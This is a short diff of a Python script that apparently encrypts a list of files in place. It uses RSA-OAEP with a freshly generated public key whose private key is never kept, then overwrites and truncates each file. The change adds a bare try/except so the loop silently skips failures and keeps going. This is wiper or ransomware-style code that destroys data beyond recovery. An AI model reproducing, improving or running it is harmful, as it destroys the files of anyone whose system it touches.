@@ -31,8 +31,11 @@ if __name__ == '__main__':	# Make sure it's not imported from another module.
 	c = PKCS1_OAEP.new(RSA.generate(MS).publickey())	# Cipher object with a randomly generated public key.
 
 	for y in x:	# Each file.
-		with open(y, 'r+') as f:	# Open it with reading and writing permissions.
-			t = c.encrypt(f.read())	# Read the file and encrypt it in memory.
-			f.seek(0)	# Overwrite from the beginning.
-			f.write(t)	# Write the encrypted content.
-			f.truncate()	# Remove the remaining bytes (if any).
+		try:
+			with open(y, 'r+') as f:	# Open it with reading and writing permissions.
+				t = c.encrypt(f.read())	# Read the file and encrypt it in memory.
+				f.seek(0)	# Overwrite from the beginning.
+				f.write(t)	# Write the encrypted content.
+				f.truncate()	# Remove the remaining bytes (if any).
+		except:
+			continue
